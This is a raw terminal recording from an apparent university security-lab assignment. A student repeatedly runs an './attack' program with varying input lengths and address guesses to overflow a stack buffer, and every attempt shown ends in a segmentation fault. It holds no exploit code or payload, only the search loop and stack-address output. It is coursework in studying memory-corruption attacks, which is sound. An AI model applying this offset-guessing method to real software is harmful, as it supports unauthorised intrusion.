+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1069 12016[1P 12016[1P 120167 120160 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1069
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1070 12016[1P 120161 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1070
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1071 12016[1P 120162 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1070
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1072 12016[C[1P 120163 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1072
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1073 12016[1P 120164 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1073
+
+
+Value of Test:ffffba28
+Value of filename[0]:ffffb620
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1074 12016[1P 120165 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1074
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1075 12016[1P 120166 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1075
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1076 12016[C[1P 120167 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1076
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1077 12016[1P 120168 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1077
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1078 12016[1P 120169 12016
+
+Using address as guess for beginning of attack buffer: 0xffffb620
+
+Length of Input String:1078
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1079 12016[C[C[C[C[C[C[C[K[K32
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1078
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1079 12032[1P 12032[1P 120328 120320 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1078
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1080 12032[C[1P 120321 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1080
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1081 12032[1P 12032[1P 120327 120325 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1074
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1075 12032[C[1P 120326 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1075
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1076 12032[1P 120327 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1076
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1077 12032[1P 120328 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1077
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1078 12032[C[1P 120329 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1078
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1079 12032[1P 12032[1P 120328 120320 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1078
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1080 12032[1P 120321 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1080
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1081 12032[1P 120322 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1081
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1082 12032[1P 120323 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1082
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1083 12032[1P 120324 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1083
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1084 12032[1P 120325 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1084
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1085 12032[1P 120326 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1085
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1086 12032[1P 120327 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1086
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1087 12032[1P 120328 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1086
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1088 12032[1P 120329 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1088
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1089 12032[1P 12032[1P 120329 120320 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1089
+
+
+Value of Test:ffffba18
+Value of filename[0]:ffffb610
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1090 12032[1P 120321 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1090
+
+
+Value of Test:ffffba08
+Value of filename[0]:ffffb600
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1091 12032[1P 120322 12032
+
+Using address as guess for beginning of attack buffer: 0xffffb610
+
+Length of Input String:1091
+
+
+Value of Test:ffffba08
+Value of filename[0]:ffffb600
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1092 12032[C[C[C[C[C[C[K[K64[1P 120641 12064
+
+Using address as guess for beginning of attack buffer: 0xffffb5f0
+
+Length of Input String:1090
+
+
+Value of Test:ffffba08
+Value of filename[0]:ffffb600
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1091 12064[1P 120642 12064
+
+Using address as guess for beginning of attack buffer: 0xffffb5f0
+
+Length of Input String:1091
+
+
+Value of Test:ffffba08
+Value of filename[0]:ffffb600
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1092 12064[1P 120643 12064
+
+Using address as guess for beginning of attack buffer: 0xffffb5f0
+
+Length of Input String:1092
+
+
+Value of Test:ffffba08
+Value of filename[0]:ffffb600
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1093 12064[1P 120644 12064
+
+Using address as guess for beginning of attack buffer: 0xffffb5f0
+
+Length of Input String:1093
+
+
+Value of Test:ffffba08
+Value of filename[0]:ffffb600
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1094 12064[1P 120645 12064
+
+Using address as guess for beginning of attack buffer: 0xffffb5f0
+
+Length of Input String:1094
+
+
+Value of Test:ffffba08
+Value of filename[0]:ffffb600
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1095 12064[C[1P 120649 12064
+
+Using address as guess for beginning of attack buffer: 0xffffb5f0
+
+Length of Input String:1098
+
+
+Value of Test:ffffba08
+Value of filename[0]:ffffb600
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/HWA2/submittedseclab@SecurityLabUbuntu64:~/HWA2/submitted$ ./attack 1099 12064[Kexity[K
+Script done on Mon Mar  7 16:11:53 2016
